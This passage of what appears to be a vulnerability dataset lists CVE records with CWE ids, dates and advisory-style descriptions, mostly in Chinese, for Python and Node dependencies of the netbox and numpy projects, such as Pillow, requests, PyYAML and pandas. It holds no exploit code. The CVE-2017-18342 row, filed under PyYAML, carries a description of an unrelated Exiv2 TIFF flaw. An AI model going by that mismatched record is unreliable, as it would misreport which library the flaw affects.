Pillow 6.2.2之前版本中的libImaging/SgiRleDecode.c文件存在缓冲区错误漏洞，该漏洞源于程序没有正确检查边界。远程攻击者可借助特制SGI文件利用该漏洞在系统上执行任意代码，或者导致应用程序崩溃。",1,2
netbox-community_netbox,Pillow,,True,CVE-2020-5313,CWE-125,2020-01-02,"Pillow是一款基于Python的图像处理库。
Pillow 6.2.2之前版本中的libImaging/FliDecode.c文件存在缓冲区错误漏洞，该漏洞源于程序没有正确检查边界。远程攻击者可借助特制FLI文件利用该漏洞在系统上执行任意代码，或者导致应用程序崩溃。",2,0
netbox-community_netbox,Pillow,,True,CVE-2019-16865,CWE-770,2019-10-04,"Pillow是一款基于Python的图像处理库。
Pillow 6.2.0之前版本中存在安全漏洞。攻击者可利用该漏洞造成拒绝服务。",2,2
netbox-community_netbox,Pillow,,True,CVE-2016-9189,CWE-190,2016-11-04,"Pillow是美国软件开发者Alex Clark所研发的一个对PIL（Python图像处理库）一些BUG修正后的编译版。

Pillow 3.3.2之前的版本中存在安全漏洞。上下文相关的攻击者可利用该漏洞获取敏感信息。",3,0
netbox-community_netbox,Pillow,,True,CVE-2016-9190,CWE-284,2016-11-04,"Pillow是美国软件开发者Alex Clark所研发的一个对PIL（Python图像处理库）一些BUG修正后的编译版。

Pillow 3.3.2之前的版本中存在安全漏洞。上下文相关的攻击者可通过使用‘crafted image file’方法利用该漏洞执行任意代码。",2,0
netbox-community_netbox,Pillow,,True,CVE-2016-0775,CWE-119,2016-04-13,"Pillow是一款基于Python的图像处理库。
Pillow 3.1.1之前版本的libImaging/FliDecode.c文件中的‘ImagingFliDecode’函数存在缓冲区错误漏洞。远程攻击者可借助特制的FLI文件利用该漏洞造成拒绝服务（崩溃）。",2,0
netbox-community_netbox,Pillow,,True,CVE-2016-2533,CWE-119,2016-04-13,"Python Image Library（PIL）是瑞士软件开发者Fredrik Lundh所研发的一个Python图像处理库。
Pillow 3.1.1之前版本和PIL 1.1.7及之前版本的PcdDecode.c文件中的‘ImagingPcdDecode’函数存在缓冲区溢出漏洞。远程攻击者可借助特制的PhotoCD文件利用该漏洞造成拒绝服务（崩溃）。",2,0
netbox-community_netbox,Pillow,,True,CVE-2014-1932,CWE-59,2014-04-17,"Python Image Library（PIL）是瑞士软件开发者Fredrik Lundh所研发的一个Python图像处理库。Pillow是对PIL的一些BUG修正后的编译版。
PIL 1.1.7及之前的版本和Pillow 2.3.0及之前的版本中的JpegImagePlugin.py文件的‘load_djpeg’函数；EpsImagePlugin.py文件的‘Ghostscript’函数；IptcImagePlugin.py文件的‘load’函数；Image.py文件的‘_copy’函数存在安全漏洞，该漏洞源于程序没有正确创建临时文件。本地攻击者可通过对临时文件的符号链接攻击利用该漏洞覆盖任意文件，获取敏感信息。",2,0
netbox-community_netbox,Pillow,,True,CVE-2014-1933,CWE-264,2014-04-17,"Python Image Library（PIL）是瑞士软件开发者Fredrik Lundh所研发的一个Python图像处理库。Pillow是对PIL的一些BUG修正后的编译版。
PIL 1.1.7及之前的版本和Pillow 2.3.0及之前的版本中的JpegImagePlugin.py和EpsImagePlugin.py脚本存在安全漏洞，该漏洞源于程序在命令行上使用临时文件名。本地攻击者可利用该漏洞实施符号链接攻击。",3,0
netbox-community_netbox,Pillow,,True,CVE-2016-0740,CWE-119,2016-04-13,"Python Image Library（PIL）是瑞士软件开发者Fredrik Lundh所研发的一个Python图像处理库。
Pillow 3.1.1之前版本的libImaging/TiffDecode.c文件中的‘ImagingLibTiffDecode’函数存在缓冲区溢出漏洞。远程攻击者可借助特制的TIFF文件利用该漏洞覆盖内存。",3,0
netbox-community_netbox,Pillow,,True,CVE-2020-10379,CWE-120,2020-06-25,"Pillow是一款基于Python的图像处理库。
Pillow 7.1.0之前版本中的libImaging/TiffDecode.c文件存在缓冲区错误漏洞。该漏洞源于网络系统或产品在内存上执行操作时，未正确验证数据边界，导致向关联的其他内存位置上执行了错误的读写操作。攻击者可利用该漏洞导致缓冲区溢出或堆溢出等。",2,0
netbox-community_netbox,Pillow,,True,CVE-2022-24303,CWE-22,2022-02-03,"Pillow是一款基于Python的图像处理库。
Pillow 9.0.1之前版本存在输入验证错误漏洞，该漏洞源于产品的remove操作未验证用户输入数据。攻击者可通过该漏洞利用输入命令来修改或删除预期的命令。",2,2
netbox-community_netbox,Pillow,,True,CVE-2022-22815,CWE-665,2022-01-07,"Pillow是一款基于Python的图像处理库。
Pillow 9.0.0 之前存在安全漏洞，该漏洞源于 path.c 中的 path_getbbox 不正确地初始化 ImagePath.Path。",3,2
netbox-community_netbox,Pillow,,True,CVE-2022-22816,CWE-125,2022-01-07,"Pillow是一款基于Python的图像处理库。
Pillow 9.0.0 之前存在安全漏洞，该漏洞源于 path.c 中的 path_getbbox 在 ImagePath.Path 初始化期间有一个缓冲区过度读取。",3,2
netbox-community_netbox,Pillow,,True,CVE-2022-22817,CWE-94,2022-01-07,"Pillow是一款基于Python的图像处理库。
Pillow 9.0.0 之前存在安全漏洞，该漏洞源于 PIL.ImageMath.eval 允许评估任意表达式，例如使用 Python exec 方法的表达式。",1,2
netbox-community_netbox,Pillow,,True,,CWE-400,2022-01-04,"## Overview
[Pillow](https://python-pillow.org/) is a PIL (Python Imaging Library) fork.

Affected versions of this package are vulnerable to Denial of Service (DoS). The `JpegImagePlugin` may append an EOF marker to the end of a truncated file, so that the last segment of the data will still be processed by the decoder. If the EOF marker is not detected as such, this can lead to an infinite loop where `JpegImagePlugin` keeps trying to end the file.

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.

Unlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.

One popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.

When it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.

Two common types of DoS vulnerabilities:

* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).

* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](https://snyk.io/vuln/npm:ws:20171108)

## Remediation
Upgrade `Pillow` to version 9.0.0 or higher.
## References
- [GitHub Commit](https://github.com/python-pillow/Pillow/pull/5921/commits/1059eb537639925c96d3245dcd73c106d4266c83)
- [GitHub Issue](https://github.com/python-pillow/Pillow/issues/5864#issuecomment-1003788821)
- [GitHub PR](https://github.com/python-pillow/Pillow/pull/5921)
- [Release Notes](https://pillow.readthedocs.io/en/stable/releasenotes/9.0.0.html#ensure-jpegimageplugin-stops-at-the-end-of-a-truncated-file)
",3,0
netbox-community_netbox,Pillow,,True,CVE-2021-34552,CWE-120,2021-07-13,"Pillow是一款基于Python的图像处理库。
Pillow 中存在缓冲区错误漏洞，该漏洞源于产品的convert .c未能验证参数的安全性，攻击者可通过该漏洞引发缓冲区溢出。以下产品及版本受到影响：Pillow 8.2.0 之前版本、PIL 1.1.7 之前版本。",1,2
netbox-community_netbox,Pillow,,True,CVE-2021-28677,CWE-20,2021-04-13,"Pillow是一款基于Python的图像处理库。
Pillow存在输入验证错误漏洞，该漏洞由于在处理换行符（例如在打开文件时使用“  r”，“  n”）时对用户提供的输入的验证不足而存在的。远程攻击者可以将特制文件传递给应用程序，并执行拒绝服务（DoS）攻击。以下产品及版本受到影响：Pillow 1.0、Pillow 1.2、Pillow 1.7.6、Pillow 1.7.7、Pillow 1.7.8、Pillow 2.0.0、Pillow 2.1.0、Pillow 2.2.0、Pillow 2.2.1、Pillow 2.2.2、Pillow 2.3.0、Pillow 2.3.1、Pillow 2.3.2、Pillow 2.4.0、Pillow 2.5.0、Pillow 2.5.1、Pillow 2.5.2、Pillow 2.5.3、Pillow 2.6.0、Pillow 2.6.1、Pillow 2.6.2、Pillow 2.7.0、Pillow 2.8.0、Pillow 2.8.1、Pillow 2.8.2、Pillow 2.9.0、Pillow 3.0.0、Pillow 3.1.0、Pillow 3.1.1、Pillow 3.1.2、Pillow 3.2.0、Pillow 3.3.0、Pillow 3.3.1、Pillow 3.3.2、Pillow 3.3.3、Pillow 3.4.0、Pillow 3.4.1、Pillow 3.4.2、Pillow 4.0.0、Pillow 4.1.0、Pillow 4.1.1、Pillow 4.2.0、Pillow 4.2.1、Pillow 4.3.0、Pillow 5.0.0、Pillow 5.1.0、Pillow 5.2.0、Pillow 5.3.0、Pillow 5.4.0、Pillow 5.4.1、Pillow 6.0.0、Pillow 6.1.0、Pillow 6.2.0、Pillow 6.2.1、Pillow 6.2.2、Pillow 6.2.3、Pillow 7.0.0、Pillow 7.0.1、Pillow 7.1.0、Pillow 7.1.1、Pillow 7.1.2、Pillow 7.2.0、Pillow 8.0.0、Pillow 8.0.1、Pillow 8.1.0、Pillow 8.1.1、Pillow 8.1.2。",2,2
netbox-community_netbox,Pillow,,True,CVE-2021-28675,CWE-252,2021-04-13,"Pillow是一款基于Python的图像处理库。
Pillow存在资源管理错误漏洞，该漏洞由于对PsdImagePlugin.PsdImageFile方法中的内部资源管理不当，远程攻击者可以将特制文件传递给应用程序，并执行拒绝服务（DoS）攻击。以下产品及版本受到影响：Pillow 1.0、Pillow 1.2、Pillow 1.7.6、Pillow 1.7.7、Pillow 1.7.8、Pillow 2.0.0、Pillow 2.1.0、Pillow 2.2.0、Pillow 2.2.1、Pillow 2.2.2、Pillow 2.3.0、Pillow 2.3.1、Pillow 2.3.2、Pillow 2.4.0、Pillow 2.5.0、Pillow 2.5.1、Pillow 2.5.2、Pillow 2.5.3、Pillow 2.6.0、Pillow 2.6.1、Pillow 2.6.2、Pillow 2.7.0、Pillow 2.8.0、Pillow 2.8.1、Pillow 2.8.2、Pillow 2.9.0、Pillow 3.0.0、Pillow 3.1.0、Pillow 3.1.1、Pillow 3.1.2、Pillow 3.2.0、Pillow 3.3.0、Pillow 3.3.1、Pillow 3.3.2、Pillow 3.3.3、Pillow 3.4.0、Pillow 3.4.1、Pillow 3.4.2、Pillow 4.0.0、Pillow 4.1.0、Pillow 4.1.1、Pillow 4.2.0、Pillow 4.2.1、Pillow 4.3.0、Pillow 5.0.0、Pillow 5.1.0、Pillow 5.2.0、Pillow 5.3.0、Pillow 5.4.0、Pillow 5.4.1、Pillow 6.0.0、Pillow 6.1.0、Pillow 6.2.0、Pillow 6.2.1、Pillow 6.2.2、Pillow 6.2.3、Pillow 7.0.0、Pillow 7.0.1、Pillow 7.1.0、Pillow 7.1.1、Pillow 7.1.2、Pillow 7.2.0、Pillow 8.0.0、Pillow 8.0.1、Pillow 8.1.0、Pillow 8.1.1、Pillow 8.1.2。",2,0
netbox-community_netbox,Pillow,,True,CVE-2021-28678,CWE-345,2021-04-13,"Pillow是一款基于Python的图像处理库。
Pillow存在数据伪造问题漏洞，该漏洞由于对PsdImagePlugin.PsdImageFile方法中的内部资源管理不当，远程攻击者可以将特制文件传递给应用程序，并执行拒绝服务（DoS）攻击。以下产品及版本受到影响：Pillow 1.0、Pillow 1.2、Pillow 1.7.6、Pillow 1.7.7、Pillow 1.7.8、Pillow 2.0.0、Pillow 2.1.0、Pillow 2.2.0、Pillow 2.2.1、Pillow 2.2.2、Pillow 2.3.0、Pillow 2.3.1、Pillow 2.3.2、Pillow 2.4.0、Pillow 2.5.0、Pillow 2.5.1、Pillow 2.5.2、Pillow 2.5.3、Pillow 2.6.0、Pillow 2.6.1、Pillow 2.6.2、Pillow 2.7.0、Pillow 2.8.0、Pillow 2.8.1、Pillow 2.8.2、Pillow 2.9.0、Pillow 3.0.0、Pillow 3.1.0、Pillow 3.1.1、Pillow 3.1.2、Pillow 3.2.0、Pillow 3.3.0、Pillow 3.3.1、Pillow 3.3.2、Pillow 3.3.3、Pillow 3.4.0、Pillow 3.4.1、Pillow 3.4.2、Pillow 4.0.0、Pillow 4.1.0、Pillow 4.1.1、Pillow 4.2.0、Pillow 4.2.1、Pillow 4.3.0、Pillow 5.0.0、Pillow 5.1.0、Pillow 5.2.0、Pillow 5.3.0、Pillow 5.4.0、Pillow 5.4.1、Pillow 6.0.0、Pillow 6.1.0、Pillow 6.2.0、Pillow 6.2.1、Pillow 6.2.2、Pillow 6.2.3、Pillow 7.0.0、Pillow 7.0.1、Pillow 7.1.0、Pillow 7.1.1、Pillow 7.1.2、Pillow 7.2.0、Pillow 8.0.0、Pillow 8.0.1、Pillow 8.1.0、Pillow 8.1.1、Pillow 8.1.2。",3,0
netbox-community_netbox,Pillow,,True,CVE-2021-28676,CWE-835,2021-04-13,"Pillow是一款基于Python的图像处理库。
Pillow存在安全漏洞，该漏洞由于对PsdImagePlugin.PsdImageFile方法中的内部资源管理不当，远程攻击者可以将特制文件传递给应用程序，并执行拒绝服务（DoS）攻击。以下产品及版本受到影响：Pillow 1.0、Pillow 1.2、Pillow 1.7.6、Pillow 1.7.7、Pillow 1.7.8、Pillow 2.0.0、Pillow 2.1.0、Pillow 2.2.0、Pillow 2.2.1、Pillow 2.2.2、Pillow 2.3.0、Pillow 2.3.1、Pillow 2.3.2、Pillow 2.4.0、Pillow 2.5.0、Pillow 2.5.1、Pillow 2.5.2、Pillow 2.5.3、Pillow 2.6.0、Pillow 2.6.1、Pillow 2.6.2、Pillow 2.7.0、Pillow 2.8.0、Pillow 2.8.1、Pillow 2.8.2、Pillow 2.9.0、Pillow 3.0.0、Pillow 3.1.0、Pillow 3.1.1、Pillow 3.1.2、Pillow 3.2.0、Pillow 3.3.0、Pillow 3.3.1、Pillow 3.3.2、Pillow 3.3.3、Pillow 3.4.0、Pillow 3.4.1、Pillow 3.4.2、Pillow 4.0.0、Pillow 4.1.0、Pillow 4.1.1、Pillow 4.2.0、Pillow 4.2.1、Pillow 4.3.0、Pillow 5.0.0、Pillow 5.1.0、Pillow 5.2.0、Pillow 5.3.0、Pillow 5.4.0、Pillow 5.4.1、Pillow 6.0.0、Pillow 6.1.0、Pillow 6.2.0、Pillow 6.2.1、Pillow 6.2.2、Pillow 6.2.3、Pillow 7.0.0、Pillow 7.0.1、Pillow 7.1.0、Pillow 7.1.1、Pillow 7.1.2、Pillow 7.2.0、Pillow 8.0.0、Pillow 8.0.1、Pillow 8.1.0、Pillow 8.1.1、Pillow 8.1.2。",2,2
netbox-community_netbox,Pillow,,True,CVE-2023-50447,CWE-94 CWE-95,2024-01-19,"Pillow是一款基于Python的图像处理库。
Pillow 10.1.0及之前版本存在安全漏洞，该漏洞源于可以通过PIL.ImageMath.eval中的environment 参数执行任意代码。",1,0
netbox-community_netbox,Pillow,,True,CVE-2023-44271,CWE-770,2023-11-03,"Pillow是一款基于Python的图像处理库。
Pillow 10.0.0之前版本存在安全漏洞，该漏洞源于不受控制地分配内存，从而导致服务崩溃。",2,2
netbox-community_netbox,Pillow,,True,CVE-2014-3589,CWE-20,2014-08-20,"Python Image Library（PIL）是瑞士软件开发者Fredrik Lundh所研发的一个Python图像处理库。
PIL和Pillow 2.3.2之前版本和2.5.2版本之前2.5.x版本的PIL/IcnsImagePlugin.py文件中存在安全漏洞。远程攻击者可通过特制的块数据利用该漏洞造成拒绝服务。",2,2
netbox-community_netbox,Pillow,,True,CVE-2014-3007,CWE-78,2014-04-27,"Python Image Library（PIL）是瑞士软件开发者Fredrik Lundh所研发的一个Python图像处理库。
PIL 1.1.7及之前的版本和Pillow 2.3版本中存在安全漏洞。远程攻击者可借助shell元字符利用该漏洞执行任意命令。",1,2
netbox-community_netbox,Pillow,,True,CVE-2020-35654,CWE-787,2021-01-11,"Pillow是一款基于Python的图像处理库。
Pillow 8.1.0之前版本中存在缓冲区错误漏洞，当解码制作好的YCbCr文件时，由于在RGBA模式下与LibTIFF的某些解释冲突，TiffDecode会出现基于堆的缓冲区溢出。",2,0
netbox-community_netbox,Pillow,,True,CVE-2019-19911,CWE-190,2020-01-05,"Pillow是一款基于Python的图像处理库。
Pillow 6.2.2之前版本中存在输入验证错误漏洞。攻击者可利用该漏洞造成拒绝服务（进程终止）。",2,2
netbox-community_netbox,Pillow,,True,CVE-2014-9601,CWE-20,2015-01-16,"Python Image Library（PIL）是瑞士软件开发者Fredrik Lundh所研发的一个Python图像处理库。
Pillow 2.7.0之前版本中存在安全漏洞。远程攻击者可借助特制的PNG图像中压缩的文本块利用该漏洞造成拒绝服务。",2,2
netbox-community_netbox,Pillow,,True,CVE-2021-25289,CWE-787,2021-03-11,"Pillow是一款基于Python的图像处理库。
Pillow 8.1.1之前版本中存在安全漏洞。该漏洞源于在解码精心编制的YCbCr文件时，TiffDecode会出现基于堆的缓冲区溢出。",1,2
netbox-community_netbox,Pillow,,True,CVE-2020-5310,CWE-190,2020-01-02,"Pillow是一款基于Python的图像处理库。
Pillow 6.2.2之前版本中的libImaging/TiffDecode.c文件存在输入验证错误漏洞，该漏洞源于程序没有正确分配内存。远程攻击者可借助特制TIFF图像利用该漏洞导致应用程序崩溃。",1,0
netbox-community_netbox,Pillow,,True,CVE-2014-3598,CWE-399,2015-05-01,"Python Image Library（PIL）是瑞士软件开发者Fredrik Lundh所研发的一个Python图像处理库。Jpeg2KImage是其中的一个图像处理插件。
PIL 2.5.3之前版本的Jpeg2KImagePlugin插件中存在安全漏洞。远程攻击者可借助特制的图像利用该漏洞造成拒绝服务。",2,2
netbox-community_netbox,Pillow,,True,CVE-2024-28219,CWE-680,2024-04-01,"Pillow是一款基于Python的图像处理库。
Pillow(PIL Fork)存在安全漏洞，该漏洞源于_imagingcms.c中存在缓冲区溢出漏洞。",2,0
netbox-community_netbox,PyYAML,,True,CVE-2020-14343,CWE-20,2020-07-26,CVE-2020-14343是与Python的第三方库“PyYAML”相关的漏洞，该库用于处理YAML文件。该漏洞的根本原因在于PyYAML库的yaml.load函数会解析未经验证的输入数据。具体来说，当用户使用yaml.load函数并且未明确指定加载器时，PyYAML会默认使用“UnsafeLoader”来解析YAML文件，这会导致任意代码执行的风险。如果攻击者能够控制传递给yaml.load的YAML内容，他们就可以构造一个恶意的YAML文件，其中包含恶意的Python对象。yaml.load在加载这个文件时会执行这些对象的代码，从而导致任意代码执行。这使得攻击者可以在目标系统上执行任意命令，潜在地获得系统的控制权限。,1,0
netbox-community_netbox,PyYAML,,True,CVE-2017-18342,CWE-502,2018-06-27,CVE-2017-18342 是一个影响 Exiv2 库的整数溢出漏洞。Exiv2 是一个用于处理图像元数据的库，在处理 TIFF 图像文件时，由于对用户输入数据的边界检查不充分，可能导致整数溢出。具体来说，该漏洞出现在 readTiffDirectory 函数中，该函数在处理 TIFF 文件中的目录项时，没有正确检查涉及的偏移量和大小。这可能导致超出预期的内存分配，并进一步引发缓冲区溢出，允许攻击者通过构造恶意的 TIFF 文件来利用该漏洞，最终导致任意代码执行。,1,0
netbox-community_netbox,requests,,True,CVE-2014-1829,CWE-200,2013-12-25,"Requests（也称python-requests）是软件开发者Kenneth Reitz和其他维护贡献者共同开发的一个采用Python语言编写的HTTP客户端库。
Requests 2.3.0之前版本中存在安全漏洞。远程攻击者可通过读取重定向请求中的Authorization头利用该漏洞获取‘netrc’密码。",3,2
netbox-community_netbox,requests,,True,CVE-2018-18074,CWE-522,2018-10-09,"Requests package for Python是一款基于Python的开源HTTP库。
Requests package for Python 2.19.1及之前版本（2018-09-14之前发布）中存在安全漏洞，该漏洞源于程序在接收到从https转换到http的重定向请求（带有相同主机名）时，会将HTTP Authorization包头发送到http URI。远程攻击者可通过嗅探网络利用该漏洞获取凭证。",2,2
netbox-community_netbox,requests,,True,,CWE-400,2012-04-07,"## Overview
[`requests`](https://pypi.python.org/pypi/requests) is a Python HTTP for Humans.

Affected versions of this package are vulnerable to Denial of Service (DoS) attacks. When sending a digest with an incorrect password, it will retry the request for infinity. An attacker can send many of these requests, causing a denial of service.

## Details
Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.

Unlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.

One popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.

When it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.

Two common types of DoS vulnerabilities:

* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).

* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](npm:ws:20171108)

## References
- [GitHub Issue](https://github.com/requests/requests/issues/541)
- [GitHub PR](https://github.com/requests/requests/pull/547)
- [GitHub Commit](https://github.com/requests/requests/pull/547/commits/c3e6c41fc164d4348f8ce197bd0075aff05637af)
",3,2
netbox-community_netbox,requests,,True,CVE-2014-1830,CWE-200,2013-12-25,"Requests（也称python-requests）是软件开发者Kenneth Reitz和其他维护贡献者共同开发的一个采用Python语言编写的HTTP客户端库。
Requests 2.3.0之前版本中存在安全漏洞。远程攻击者可通过读取重定向请求中的Proxy-Authorizatio头利用该漏洞获取敏感信息。",3,2
netbox-community_netbox,requests,,True,,CWE-400,2023-11-01,"## Overview

Affected versions of this package are vulnerable to Denial of Service (DoS) due to incorrect password used in conjunction with digest authentication. This can lead to an infinite request retry cycle

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.

Unlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.

One popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.

When it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.

Two common types of DoS vulnerabilities:

* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).

* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](https://snyk.io/vuln/npm:ws:20171108)

## Remediation
Upgrade `requests` to version 0.12.0 or higher.
## References
- [GitHub Commit](https://github.com/psf/requests/commit/f3ad56f103e364671504bb0d960a0ed69c2eafbc)
",2,2
netbox-community_netbox,requests,,True,CVE-2024-35195,CWE-670,2024-05-20,"Requests是Python基金会的一个优雅而简单的HTTP库。通过请求，您可以非常轻松地发送HTTP / 1.1请求。无需将查询字符串手动添加到您的URL，也无需对POST数据进行表单编码。
Requests 2.32.0之前版本存在安全漏洞，该漏洞源于禁用证书验证后在连接的生命周期中持续存在，后续所有请求都将被忽略。",3,0
netbox-community_netbox,requests,,True,CVE-2024-47081,CWE-522,2025-06-06,Requests库用于发送HTTP请求的Python库。该漏洞涉及Netrc凭证泄漏，可能导致敏感信息泄露。,3,2
netbox-community_netbox,requests,,True,,,,<p>Python Requests 是一个用于发送 HTTP 请求的开源库，广泛用于 Web 应用程序中。当请求涉及到公共后缀域的 Set-Cookie 头时，可能会导致 Cookie 被错误地发送到所有公共后缀域。此漏洞的根本原因在于 Python Requests 在处理包含公共后缀的 Cookie 域时，未能正确限制 Cookie 的发送。攻击者可以利用这个漏洞，诱使用户访问特定 URL，从而在请求过程中窃取敏感信息。</p>,2,1
netbox-community_netbox,social-auth-app-django,,True,CVE-2024-32879,CWE-178 CWE-303,2024-04-24,"Python Social Auth是Python Social Auth开源的一种易于设置的社交身份验证/注册机制。支持多个框架和身份验证提供者。
Python Social Auth 5.4.1之前版本存在安全漏洞，该漏洞源于 MySQL、MariaDB数据库中默认不区分大小写的排序规则，第三方身份验证用户ID不区分大小写，可能会导致不同的ID匹配。",3,0
netbox-community_netbox,social-auth-app-django,,True,CVE-2025-61783,CWE-303,2025-10-09,"Python Social Auth是Python Social Auth开源的一种易于设置的社交身份验证/注册机制。支持多个框架和身份验证提供者。
Python Social Auth 5.6.0之前版本存在安全漏洞，该漏洞源于未验证电子邮件关联机制，可能导致账户接管。",3,0
netbox-community_netbox,strawberry-graphql,,True,,CWE-362,2023-08-01,"## Overview
[strawberry-graphql](https://pypi.org/project/strawberry-graphql) is an A library for creating GraphQL APIs

Affected versions of this package are vulnerable to Race Condition when confirming `GQL` subscriptions, due to missing checks in the `strawberry/channels/handlers/base.py` file.
## Remediation
Upgrade `strawberry-graphql` to version 0.193.0 or higher.
## References
- [GitHub Commit](https://github.com/strawberry-graphql/strawberry/commit/c18be1f90c4ea70a05ad85712dad0f1b93a30643)
- [GitHub Issue](https://github.com/strawberry-graphql/strawberry/issues/2799)
- [GitHub PR](https://github.com/strawberry-graphql/strawberry/pull/2856)
- [GitHub Release](https://github.com/strawberry-graphql/strawberry/releases/tag/0.193.0)
",3,0
netbox-community_netbox,strawberry-graphql,,True,,CWE-89,2021-09-05,"## Overview
[strawberry-graphql](https://pypi.org/project/strawberry-graphql) is an A library for creating GraphQL APIs

Affected versions of this package are vulnerable to SQL Injection due to a lack of validations against malicious queries.
## Remediation
Upgrade `strawberry-graphql` to version 0.71.0 or higher.
## References
- [GitHub Commit](https://github.com/strawberry-graphql/strawberry/commit/cf934e63baa03d1f651cbb112bcc5dc764c1a221)
",3,0
netbox-community_netbox,strawberry-graphql,,True,CVE-2024-47082,CWE-352,2024-09-25,Strawberry GraphQL 是一个用于创建 GraphQL API 的库。该漏洞影响 0.243.0 之前的版本，默认启用了多部分文件上传支持，这一实现使得所有 HTTP 视图集成都容易受到 CSRF 攻击。在 Django 集成中，默认配置下还绕过了 Django 内置的 `CsrfViewMiddleware`，进一步加剧了风险。漏洞的根本原因是文件上传处理程序未启用 CSRF 防护，特别是在 Django 环境中，应用程序的 CSRF 防护被绕过。,3,0
netbox-community_netbox,tablib,,True,CVE-2017-2810,CWE-502,2017-06-14,Tablib 是由 Kenneth Reitz 开发的一个用于处理表格格式数据的 Python 库。该库提供了多种数据格式的导入、导出和管理功能。在 Tablib 0.11.4 版本中，Databook 加载功能存在代码执行漏洞。攻击者可以通过此功能执行任意的 Python 命令，导致潜在的安全风险。,1,0
netbox-community_netbox,cross-spawn,7.0.3,False,CVE-2024-21538,CWE-1333,2024-11-08,cross-spawn 是一个用于在 Node.js 环境中跨平台地扩展 child_process.spawn 的开源软件包。该软件包在处理用户输入时存在正则表达式拒绝服务（ReDoS）漏洞，这是由于输入的正则表达式在解析时没有进行恰当的输入验证所导致。该漏洞存在于 7.0.5 版本之前的 cross-spawn 包中，如果攻击者提供了一个特殊构造的大型字符串作为输入，可能会在解析过程中导致 CPU 使用率飙升，从而造成程序卡顿或崩溃。,2,2
numpy_numpy,scipy,,True,CVE-2013-4251,CWE-269,2013-10-17,"SciPy是SciPy社区的所开发的一个开源的Python算法库和数学、科学、工程计算包，它包含了线性代数、积分、特殊函数等计算模块。
SciPy 0.12.1之前版本中存在安全漏洞。本地攻击者可利用该漏洞以运行‘scipy.weave’组件的用户权限执行任意代码。",2,0
numpy_numpy,scipy,,True,CVE-2023-29824,CWE-416,2023-07-06,"SciPy是Scipy社区的所开发的一个开源的Python算法库和数学、科学、工程计算包，它包含了线性代数、积分、特殊函数等计算模块。
SciPy 1.8.0之前版本存在安全漏洞，该漏洞源于Py_FindObjects()函数存在内存释放后重用问题。",1,2
numpy_numpy,scipy,,True,CVE-2023-25399,CWE-401,2023-07-05,"SciPy是Scipy社区的所开发的一个开源的Python算法库和数学、科学、工程计算包，它包含了线性代数、积分、特殊函数等计算模块。
SciPy 存在安全漏洞，该漏洞源于在Py_FindObjects()函数中存在导致潜在内存泄漏的重新计数问题。",3,0
numpy_numpy,pandas,,True,CVE-2020-13091,CWE-502,2020-05-15,"pandas是一款基于Python语言的开源数据分析和处理工具。
pandas 1.0.3及之前版本中存在代码问题漏洞。攻击者可利用该漏洞执行命令。",1,2
numpy_numpy,pandas,,True,,CWE-89,2023-09-03,"## Overview
[pandas](https://pypi.org/project/pandas/) is a Python package providing data structures designed to make working with structured (tabular, multidimensional, potentially heterogeneous) and time series data both easy and intuitive.

Affected versions of this package are vulnerable to SQL Injection via `sql.py`, due to improper input sanitization.
## Remediation
Upgrade `pandas` to version 0.16.0 or higher.
## References
- [GitHub Commit](https://github.com/pandas-dev/pandas/commit/a774ee84485412459f7205cccd87b639022afd07)
- [GitHub PR](https://github.com/pandas-dev/pandas/pull/8986)
",2,2
numpy_numpy,pandas,,True,CVE-2024-9880,CWE-77,,Pandas是一个开源的Python数据分析与处理库，提供高效的数据结构与数据分析工具。此漏洞存在于pandas.DataFrame.query()函数，攻击者可以通过构造恶意查询来执行任意命令。该漏洞源于对用户输入验证不足，特别是在使用'python'引擎时，导致可能的远程命令执行。,2,1
numpy_numpy,pandas,,True,,,,<p>pandas 是一个流行的 Python 数据分析库，提供高效的数据操作和分析工具。该库中的 read_xml 函数存在本地文件包含 (LFI) 漏洞，因为其 path_or_buffer 参数未经过严格的路径验证，攻击者可以通过提供恶意文件路径访问任意文件。这可通过调用 get_handle 函数实现，该函数在没有验证路径的情况下打开文件，从而导致敏感文件的泄露，比如 /etc/passwd 和 /etc/shadow。</p>,3,1
numpy_numpy,ipython,!=8.1.0,True,CVE-2023-24816,CWE-20 CWE-78,2023-02-10,"Interactive Python（IPython）是一个用于使用多种编程语言进行交互式计算的命令shell，最初是为Python编程语言开发的。
IPython(Interactive Python) 8.1.0之前版本存在操作系统命令注入漏洞。攻击者利用该漏洞执行命令注入攻击。",4,0
numpy_numpy,GitPython,>=3.1.30,True,CVE-2024-22190,CWE-426,2024-01-10,"GitPython是gitpython-developers开源的一个用于与 Git 存储库交互的 Python 库。
